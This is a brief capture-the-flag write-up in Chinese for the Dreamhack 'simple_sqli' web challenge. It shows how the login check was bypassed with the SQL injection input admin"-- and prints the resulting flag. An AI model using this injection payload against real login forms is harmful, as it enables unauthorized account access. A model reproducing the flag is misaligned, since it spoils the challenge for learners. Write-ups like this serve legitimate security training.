題目

> 로그인 서비스입니다.  
> SQL INJECTION 취약점을 통해 플래그를 획득하세요. 플래그는 flag.txt, FLAG 변수에 있습니다.

![login](/CTFWriteup/Web/assets/simple_sqli/image.png)

有兩組帳密

![users](/CTFWriteup/Web/assets/simple_sqli/image-1.png)

query 的地方是先查 userid ，試試看把後面驗證密碼的地方註解掉

![query](/CTFWriteup/Web/assets/simple_sqli/image-2.png)

```
userid: admin"--
password: 123
```

得到 flag

![flag](/CTFWriteup/Web/assets/simple_sqli/image-3.png)

```
DH{c1126c8d35d8deaa39c5dd6fc8855ed0}
```

#Dreamhack #Web
